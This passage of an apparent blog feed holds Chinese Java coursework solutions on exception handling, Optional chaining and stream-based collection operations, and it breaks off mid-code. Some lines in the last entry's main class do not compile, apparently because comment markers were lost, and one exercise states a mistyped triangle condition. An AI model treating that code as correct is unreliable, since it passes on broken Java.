        <content type="html"><![CDATA[<p>1从键盘输入一个整形数n，如果输入正确的话，输出10-n后的值，如果输入错误的话输出“not int”最后输出end</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package shiyan6;</span><br><span class="line">//@@author lubolin</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">public class i8619 &#123;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">Scanner scan = new Scanner(System.in);</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">int m = Integer.parseInt(scan.next());</span><br><span class="line">System.out.println(10 - m);</span><br><span class="line">&#125; catch (NumberFormatException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;not int&quot;</span>);</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;end&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">scan.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2模拟向货船上装载集装箱，每个集装箱有一定重量，该重量（整数）大于100小于1000，货船总重为1000，装载若干集装箱后，如果货船超重，那么货船认为这是一个异常，将拒绝装载集装箱，但无论是否发生异常，货船都需要正点启航。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import java.util.Scanner;</span><br><span class="line">class DangerException extends Exception &#123;</span><br><span class="line">    //starts</span><br><span class="line">    public void <span class="function"><span class="title">showError</span></span>() &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;超重&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">//end</span><br><span class="line">&#125; </span><br><span class="line">class CargoBoat &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    int realContent;  //装载的重量</span><br><span class="line">    int maxContent;   //最大装载量</span><br><span class="line">    public void setMaxContent(int c) &#123;</span><br><span class="line">    maxContent = c;</span><br><span class="line">    &#125;</span><br><span class="line">    public void loading(int m) throws DangerException &#123;</span><br><span class="line">   </span><br><span class="line">  //starts</span><br><span class="line">    realContent+=m;</span><br><span class="line">    <span class="keyword">if</span>(realContent&gt;maxContent)throw new DangerException();</span><br><span class="line">    System.out.printf(<span class="string">&quot;目前装载了%d吨货物\n&quot;</span>,realContent);</span><br><span class="line">//end</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Main &#123;</span><br><span class="line">public static void main(String args[]) &#123;</span><br><span class="line">CargoBoat ship = new CargoBoat();</span><br><span class="line">Scanner s=new Scanner(System.in);</span><br><span class="line">ship.setMaxContent(1000);</span><br><span class="line">int m=0;</span><br><span class="line">try&#123;</span><br><span class="line">//starts</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">m=s.nextInt();</span><br><span class="line">ship.loading(m);</span><br><span class="line">&#125;</span><br><span class="line">//end</span><br><span class="line">&#125;</span><br><span class="line">catch(DangerException e) &#123;</span><br><span class="line">//starts</span><br><span class="line">e.showError();</span><br><span class="line">System.out.printf(<span class="string">&quot;无法再装载重量是%d吨的集装箱\n&quot;</span>,m);</span><br><span class="line">//end</span><br><span class="line">&#125;</span><br><span class="line">finally &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;货船将正点启航&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3写一个方法void triangle(int a,int b,int c)，判断三个参数是否能构成一个三角形。如果不能则抛出异常IllegalArgumentException，显示异常信息：“a,b,c不能构成三角形”；如果可以构成则显示三角形三个边长。在主方法中得到命令行输入的三个整数，调用此方法，并捕获异常。 （注：两边之和大于第三边：a+b&gt;c；两边之差小于第三边：a&gt;c-a）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import java.util.Arrays;</span><br><span class="line">import java.util.InputMismatchException;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line">class TestTriangle &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">      </span><br><span class="line">    static void triangle(int a, int b,int c) throws IllegalArgumentException,InputMismatchException&#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">//starts</span><br><span class="line">    <span class="keyword">if</span>(a&lt;0||b&lt;0||c&lt;0||a+b&lt;=c||a+c&lt;=b||b+c&lt;=a) throw new IllegalArgumentException();</span><br><span class="line">    System.out.printf(<span class="string">&quot;三角形的三边长为：%d,%d,%d\n&quot;</span>,a,b,c);</span><br><span class="line">//end</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Main &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">int a=0, b=0, c=0;</span><br><span class="line">Scanner <span class="keyword">in</span> = new Scanner(System.in);</span><br><span class="line">try&#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    //starts</span><br><span class="line">a = in.nextInt();</span><br><span class="line">    b = in.nextInt();</span><br><span class="line">    c = in.nextInt();</span><br><span class="line">    TestTriangle.triangle(a,b,c);</span><br><span class="line">//end</span><br><span class="line">    &#125;</span><br><span class="line">catch(InputMismatchException e) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">System.err.println(<span class="string">&quot;请输入整数作为三角形的边长！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">catch(IllegalArgumentException e) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">System.err.println(<span class="string">&quot;a,b,c不能构成三角形&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java Optional操作</title>
      <link href="/2021/12/28/Java-Optional%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/12/28/Java-Optional%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h4 id="Optional操作"><a href="#Optional操作" class="headerlink" title="Optional操作"></a>Optional操作</h4><p>在com.experiment05.entity下，创建Student/Teacher/College类，代码如下；<br>在com.experiment05.resource下，创建DatabaseUtils类，代码如下；<br>基于Optional，按需求实现测试类Test中的方法，模拟正确/错误数据信息验证代码的有效性</p><h4 id="com-experiment05"><a href="#com-experiment05" class="headerlink" title="com.experiment05"></a>com.experiment05</h4><h4 id="Test-java"><a href="#Test-java" class="headerlink" title="Test.java"></a>Test.java</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package com.experiment05;</span><br><span class="line">import com.experiment05.entity.College;</span><br><span class="line">import com.experiment05.entity.Student;</span><br><span class="line">import com.experiment05.entity.Teacher;</span><br><span class="line">import com.experiment05.resource.DatabaseUtils;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Optional;</span><br><span class="line">import java.util.stream.Collectors;</span><br><span class="line">import java.util.stream.Stream;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(getCollegeName(DatabaseUtils.getStudents(),8888));</span><br><span class="line">        </span><br><span class="line">        System.out.print(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        printCollegeName(DatabaseUtils.getStudents(), 201001, 1001);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"></span><br><span class="line"> * author lubolin</span><br><span class="line"> */</span><br><span class="line">private static String getCollegeName(List&lt;Student&gt; students, int sNumber) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span>  students.stream()</span><br><span class="line">            .filter(a -&gt; a.getNum() == sNumber)</span><br><span class="line">            .collect(Collectors.toList())</span><br><span class="line">            .stream()</span><br><span class="line">            .findFirst()</span><br><span class="line">            .map(Student::getT)</span><br><span class="line">            .map(Teacher::getC)</span><br><span class="line">            .map(College::getName)</span><br><span class="line">            .orElse(<span class="string">&quot;************&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"></span><br><span class="line"> * </span><br><span class="line"> *  * author lubolin</span><br><span class="line"> */</span><br><span class="line">private static void printCollegeName(List&lt;Student&gt; students, int sNumber, int tNumber) &#123;</span><br><span class="line">System.out.println(students.stream()</span><br><span class="line">            .filter(a -&gt; a.getNum() == sNumber)</span><br><span class="line">            .collect(Collectors.toList())</span><br><span class="line">            .stream()</span><br><span class="line">            .findFirst()</span><br><span class="line">            .map(Student::getT)</span><br><span class="line">            .filter(a -&gt; a.getI() == tNumber)</span><br><span class="line">            .map(Teacher::getC)</span><br><span class="line">            .map(College::getName)</span><br><span class="line">            .orElse(<span class="string">&quot;*************&quot;</span>));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="com-experiment05-entity"><a href="#com-experiment05-entity" class="headerlink" title="com.experiment05.entity"></a>com.experiment05.entity</h4><h4 id="college-java"><a href="#college-java" class="headerlink" title="college.java"></a>college.java</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.experiment05.entity;</span><br><span class="line"></span><br><span class="line">public class College &#123;</span><br><span class="line">    String name;</span><br><span class="line">    </span><br><span class="line">public String <span class="function"><span class="title">getName</span></span>() &#123;</span><br><span class="line"><span class="built_in">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setName(String name) &#123;</span><br><span class="line">this.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public College(String string) &#123;</span><br><span class="line">this.name=string;</span><br><span class="line">// TODO Auto-generated constructor stub</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="com-experiment05-entity-1"><a href="#com-experiment05-entity-1" class="headerlink" title="com.experiment05.entity"></a>com.experiment05.entity</h4><h4 id="student-java"><a href="#student-java" class="headerlink" title="student.java"></a>student.java</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package com.experiment05.entity;</span><br><span class="line"></span><br><span class="line">public class Student &#123;</span><br><span class="line"></span><br><span class="line">int num;</span><br><span class="line">String name;</span><br><span class="line">int grade;</span><br><span class="line">Teacher t;</span><br><span class="line"></span><br><span class="line">public int <span class="function"><span class="title">getNum</span></span>() &#123;</span><br><span class="line"><span class="built_in">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setNum(int num) &#123;</span><br><span class="line">this.num = num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public String <span class="function"><span class="title">getName</span></span>() &#123;</span><br><span class="line"><span class="built_in">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setName(String name) &#123;</span><br><span class="line">this.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public int <span class="function"><span class="title">getGrade</span></span>() &#123;</span><br><span class="line"><span class="built_in">return</span> grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setGrade(int grade) &#123;</span><br><span class="line">this.grade = grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Teacher <span class="function"><span class="title">getT</span></span>() &#123;</span><br><span class="line"><span class="built_in">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setT(Teacher t) &#123;</span><br><span class="line">this.t = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Student(int i, String string, int j) &#123; </span><br><span class="line">//</span><br><span class="line">this.num=i;</span><br><span class="line">this.name=string;</span><br><span class="line">this.grade=j;</span><br><span class="line"></span><br><span class="line">// TODO Auto-generated constructor stub</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setTeacher(Teacher t1) &#123;</span><br><span class="line">// TODO Auto-generated method stub</span><br><span class="line">this.t=t1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="com-experiment05-entity-2"><a href="#com-experiment05-entity-2" class="headerlink" title="com.experiment05.entity"></a>com.experiment05.entity</h4><h4 id="teacher-java"><a href="#teacher-java" class="headerlink" title="teacher.java"></a>teacher.java</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package com.experiment05.entity;</span><br><span class="line"></span><br><span class="line">public class Teacher &#123;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line">String s;</span><br><span class="line">College c;</span><br><span class="line">public int <span class="function"><span class="title">getI</span></span>() &#123;</span><br><span class="line"><span class="built_in">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setI(int i) &#123;</span><br><span class="line">this.i = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public String <span class="function"><span class="title">getS</span></span>() &#123;</span><br><span class="line"><span class="built_in">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setS(String s) &#123;</span><br><span class="line">this.s = s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public College <span class="function"><span class="title">getC</span></span>() &#123;</span><br><span class="line"><span class="built_in">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setC(College c) &#123;</span><br><span class="line">this.c = c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Teacher(int i, String string) &#123;//</span><br><span class="line">this.i=i;</span><br><span class="line">this.s=string;</span><br><span class="line">// TODO Auto-generated constructor stub</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void setCollege(College c1) &#123;</span><br><span class="line">// TODO Auto-generated method stub</span><br><span class="line">this.c=c1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="com-experiment05-resource"><a href="#com-experiment05-resource" class="headerlink" title="com.experiment05.resource"></a>com.experiment05.resource</h4><h4 id="DatabaseUtils-java"><a href="#DatabaseUtils-java" class="headerlink" title="DatabaseUtils.java"></a>DatabaseUtils.java</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package com.experiment05.resource;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.experiment05.entity.College;</span><br><span class="line">import com.experiment05.entity.Student;</span><br><span class="line">import com.experiment05.entity.Teacher;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class DatabaseUtils &#123;</span><br><span class="line">    private static final List&lt;Student&gt; STUDENTS = create();</span><br><span class="line"></span><br><span class="line">    private static List&lt;Student&gt; <span class="function"><span class="title">create</span></span>() &#123;</span><br><span class="line">        College c1 = new College(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        College c2 = new College(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Teacher t1 = new Teacher(1001, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        t1.setCollege(c1);</span><br><span class="line">        Teacher t2 = new Teacher(1002, <span class="string">&quot;3&quot;</span>);</span><br><span class="line">        t2.setCollege(c2);</span><br><span class="line"></span><br><span class="line">        Student s1 = new Student(201001,<span class="string">&quot;4&quot;</span>, 2010);</span><br><span class="line">        s1.setTeacher(t1);</span><br><span class="line">        Student s2 = new Student(201002,<span class="string">&quot;5&quot;</span>, 2010);</span><br><span class="line">        s2.setTeacher(t1);</span><br><span class="line">        Student s3 = new Student(201103,<span class="string">&quot;6&quot;</span>, 2011);</span><br><span class="line">        s3.setTeacher(t2);</span><br><span class="line">        Student s4 = new Student(201104,<span class="string">&quot;7&quot;</span>, 2011);</span><br><span class="line">        s4.setTeacher(t2);</span><br><span class="line"></span><br><span class="line">        List&lt;Student&gt; students = new ArrayList&lt;&gt;();</span><br><span class="line">        students.add(s1); students.add(s2);</span><br><span class="line">        students.add(s3); students.add(s4);</span><br><span class="line">        <span class="built_in">return</span> students;</span><br><span class="line">    &#125;</span><br><span class="line">    public static List&lt;Student&gt; <span class="function"><span class="title">getStudents</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> STUDENTS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java 集合与函数式编程</title>
      <link href="/2021/12/28/Java1/"/>
      <url>/2021/12/28/Java1/</url>
      
        <content type="html"><![CDATA[<h4 id="集合与函数式编程实验"><a href="#集合与函数式编程实验" class="headerlink" title="集合与函数式编程实验"></a>集合与函数式编程实验</h4><p>在com.experiment04.entity下，创建Student类，代码如下；<br>在com.experiment04.resource下，创建DatabaseUtils类，代码如下；<br>在com.experiment04.service下，创建StudentService接口，代码如下；<br>在com.experiment04.service.impl下，创建StudentService接口的实现类StudentServiceImpl，基于集合stream等操作，按接口方法注释需求实现</p><h5 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h5><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import com.experiment04.entity.Student;</span><br><span class="line">import com.experiment04.service.StudentService;</span><br><span class="line">import com.experiment04.service.impl.StudentServiceImpl;</span><br><span class="line">public class main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        StudentService studentService=new StudentServiceImpl();</span><br><span class="line">        StudentServiceImpl studentServiceShow(StudentServiceImpl)studentService;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;--------------1.向集合添加一个学生，返回当前全部学生----------------------&quot;);</span><br><span class="line">        studentService.addStudent(new Student(201001, Student.Sex.FEMALE, &quot;赵阳阳&quot;, 2010));</span><br><span class="line">        studentService.addStudent(new Student(201002, Student.Sex.MALE, &quot;邵鹏&quot;, 2010));</span><br><span class="line">        studentService.addStudent(new Student(201103, Student.Sex.MALE, &quot;高学斌&quot;, 2011));</span><br><span class="line">        studentService.addStudent(new Student(201104, Student.Sex.MALE, &quot;张扬&quot;, 2011));</span><br><span class="line">        studentService.addStudent(new Student(201205, Student.Sex.FEMALE, &quot;吕惠玲&quot;, 2012));</span><br><span class="line">        studentService.addStudent(new Student(201206, Student.Sex.MALE, &quot;曾志优&quot;, 2012));</span><br><span class="line">        show</span><br><span class="line">        studentServiceShow.studentList.forEach(u-&gt; System.out.println(u.getId()+&quot; &quot;</span><br><span class="line">        +u.getName()+&quot; &quot;</span><br><span class="line">                +u.getYear()+&quot; &quot;</span><br><span class="line">                +u.getSex()+&quot; &quot;</span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        2.返回指定届的全部学生</span><br><span class="line">        System.out.println(&quot;---------------2.返回指定届的全部学生---------------------&quot;);</span><br><span class="line">        studentService.listStudentsByYear(2010).forEach(u-&gt; System.out.println(u.getId()+&quot; &quot;</span><br><span class="line">                +u.getName()+&quot; &quot;</span><br><span class="line">                +u.getYear()+&quot; &quot;</span><br><span class="line">                +u.getSex()+&quot; &quot;</span><br><span class="line">        ));</span><br><span class="line">        ///3.返回指定届，指定性别的全部学生的姓名</span><br><span class="line">        System.out.println(&quot;----------------3.返回指定届，指定性别的全部学生的姓名--------------------&quot;);</span><br><span class="line">        studentService.listStudentsNames(2010, Student.Sex.MALE).forEach(u-&gt; System.out.println(u));</span><br><span class="line">        ///4.将所有学生，以性别分组</span><br><span class="line">        System.out.println(&quot;----------------4.将所有学生，以性别分组--------------------&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            studentService.mapStudentsBySex().get(Student.Sex.MALE).forEach(u-&gt; System.out.println(u.getId()+&quot; &quot;</span><br><span class="line">                            +u.getName()+&quot; &quot;</span><br><span class="line">                            +u.getYear()+&quot; &quot;</span><br><span class="line">                            +u.getSex()+&quot; &quot;</span><br><span 